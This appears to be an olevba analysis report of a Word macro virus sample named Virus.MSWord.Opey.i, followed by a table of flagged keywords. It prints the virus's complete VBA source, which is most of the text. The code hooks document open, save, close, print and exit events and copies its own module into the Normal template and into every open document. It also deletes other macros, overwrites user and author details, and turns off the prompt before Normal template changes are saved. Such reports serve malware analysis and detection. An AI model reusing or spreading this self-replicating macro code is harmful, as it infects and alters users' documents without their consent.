olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.i-5b2c1aa07dadec56c2957b0bf7cfc86edd482fff
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.i-5b2c1aa07dadec56c2957b0bf7cfc86edd482fff - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FoxChitShareWare.bas 
in file: Virus.MSWord.Opey.i-5b2c1aa07dadec56c2957b0bf7cfc86edd482fff - OLE stream: 'Macros/VBA/FoxChitShareWare'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Immunize()
On Error Resume Next
    
    Call A_OPEY_03
    Dim DocuName$, OpenDocInfected As Boolean
    Dim I%, J%
    
    NmlInfected = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = "FoxChitShareWare" Then NmlInfected = True
        If (DocuName <> "FoxChitShareWare") And (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    For Each opendoc In Documents
        OpenDocInfected = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
            DocuName = opendoc.VBProject.VBComponents(J).Name
                'If DocuName = "A_OPEY_03" Then OpenDocInfected = True
                'If (DocuName <> "A_OPEY_03") And
                If (DocuName <> "FoxChitShareWare") And _
                  (DocuName <> "ThisDocument") And _
                  (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocInfected Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="FoxChitShareWare", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If NmlInfected = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="FoxChitShareWare", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
End Sub
Sub A_OPEY_03()
On Error Resume Next
    
    With Application
        .UserName = "Ulysses R. Gotera"
        .UserAddress = "FoxChit SoftWare Solutions"
        .UserInitials = "IOnlyFinishedHighSchool"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Ulysses Gotera"
        .Title = "FoxChit Software Solutions"
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = True
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = True
    End With
    
    On Error Resume Next
    'CommandBars("Visual Basic").Visible = False
    'CommandBars("Visual Basic").Enabled = False
    'CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    'CommandBars("Visual Basic").Protection = msoBarNoCustomize
    'CommandBars("Tools").Controls("Macro").Delete
    'CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    'FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    'FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    
End Sub
Sub FileSave()
    On Error Resume Next
    Call Immunize
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
    Call Immunize
End Sub
Sub AutoExec()
On Error Resume Next
    Call Immunize
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
On Error Resume Next
    Call Immunize
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
On Error Resume Next
    Call Immunize
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

